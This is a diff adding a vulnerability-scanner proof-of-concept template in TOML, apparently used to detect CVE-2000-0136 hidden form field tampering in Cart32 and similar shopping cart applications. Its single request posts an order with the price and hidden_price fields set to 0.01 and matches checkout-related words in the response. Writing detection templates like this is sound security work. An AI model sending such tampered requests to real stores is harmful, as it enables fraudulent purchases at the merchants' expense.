@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "检测 Cart32 等多款购物车应用隐藏表单字段篡改漏洞，通过修改 HTTP POST 请求中价格等隐藏字段值验证服务器是否信任客户端提交的敏感数据"
+id = "POC-AVE-2000-0406"
+name = "Cart32/QuickCommerce/Shop Express/StoreCreator Hidden Form Field Tampering PoC"
+severity = "high"
+tags = ["cve-2000-0136"]
+vuln_id = [
+    "CVE-2000-0136",
+    "AVE-2000-0406",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cart32.exe"
+protocol = "http"
+
+[poc.requests.body]
+content = "item=1&quantity=1&price=0.01&hidden_price=0.01"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "order",
+    "total",
+    "receipt",
+    "checkout",
+]
